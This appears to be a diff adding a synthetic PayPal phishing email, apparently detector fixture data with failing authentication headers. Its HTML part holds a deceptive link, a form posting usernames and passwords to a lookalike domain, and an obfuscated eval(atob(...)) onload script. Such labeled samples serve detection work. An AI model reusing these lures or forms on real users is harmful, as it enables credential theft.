@@ -1,0 +1,35 @@
+From: notice@secure-paypal.vercel.app
+To: victim3@example.com
+Subject: Access notice from PayPal [ref FA88303]
+Date: Tue, 04 Mar 2002 05:05:00 -0500
+Message-ID: <phish-243-34fa9a28-0205-4220-b353-0f3a9662ed72@secure-paypal.vercel.app>
+Received: from relay0 (relay0.example.net [192.0.2.100]) by mx0.example.com; Tue, 22 Mar 2002 19:24:00 -0500
+Received: from relay1 (relay1.example.net [192.0.2.101]) by mx1.example.com; Tue, 28 Mar 2002 05:10:00 -0500
+Received: from relay2 (relay2.example.net [192.0.2.102]) by mx2.example.com; Tue, 01 Mar 2002 12:10:00 -0500
+Received: from relay3 (relay3.example.net [192.0.2.103]) by mx3.example.com; Tue, 20 Mar 2002 14:55:00 -0500
+Received: from relay4 (relay4.example.net [192.0.2.104]) by mx4.example.com; Tue, 17 Mar 2002 07:42:00 -0500
+Received: from relay5 (relay5.example.net [192.0.2.105]) by mx5.example.com; Tue, 04 Mar 2002 00:07:00 -0500
+Received: from relay6 (relay6.example.net [192.0.2.106]) by mx6.example.com; Tue, 13 Mar 2002 17:41:00 -0500
+Received: from relay7 (relay7.example.net [192.0.2.107]) by mx7.example.com; Tue, 03 Mar 2002 06:10:00 -0500
+Return-Path: <bounce@mail-8605e7f.top>
+Reply-To: recovery3@gmail.com
+Authentication-Results: mx.example.com; spf=fail smtp.mailfrom=mail-8605e7f.top; dkim=fail header.d=secure-paypal.vercel.app; dmarc=fail header.from=secure-paypal.vercel.app
+Received-SPF: fail (mx.example.com: domain of notice@secure-paypal.vercel.app does not designate 203.0.113.10 as permitted sender)
+DKIM-Signature: v=1; a=rsa-sha256; d=secure-paypal.vercel.app; s=default; h=from:to:subject;
+MIME-Version: 1.0
+Content-Type: multipart/alternative; boundary="bnd-p-243-97c6ecb6"
+
+--bnd-p-243-97c6ecb6
+Content-Type: text/plain; charset="UTF-8"
+
+Hello,
+
+A new access notice is available for your profile.
+Review it here: https://login.secure.secure-paypal.vercel.app/auth?t=FA88303
+
+Reference: FA88303
+--bnd-p-243-97c6ecb6
+Content-Type: text/html; charset="UTF-8"
+
+<html><body onload="track()"><p>Hello,<br/><br/>A new access notice is available for your profile.<br/>Review it here: https://login.secure.secure-paypal.vercel.app/auth?t=FA88303<br/><br/>Reference: FA88303</p><p><a href="http://secure-paypal.vercel.app/login">https://www.paypal.com/signin</a></p><form action="http://secure-paypal.vercel.app/login" method="post"><input type="text" name="user"/><input type="password" name="pass" style="display:none"/><input type="submit" value="Continue"/></form><script>var s="review the notice";eval(atob('qGiGpdKXgULaLYzzeOvIPPXqitsyfzBRIsdOdZOIuowT+gBW+4C3F0EjMTQ9D98D/uzOWHyYtHSjSwieeCRbGpVjZfLZDjVlAgUSBD6u/D19yhJoHnvzeufP3BG1oynVRbmwDJYv7Qdx7ZA9oSzvBMqORsJdqFBNVGw+QxnEnsjd7w5LNM/L4SSCkGR9Ug52IgwEtZQoWrzTtIYlpnJrMQ=='));</script></body></html>
+--bnd-p-243-97c6ecb6--
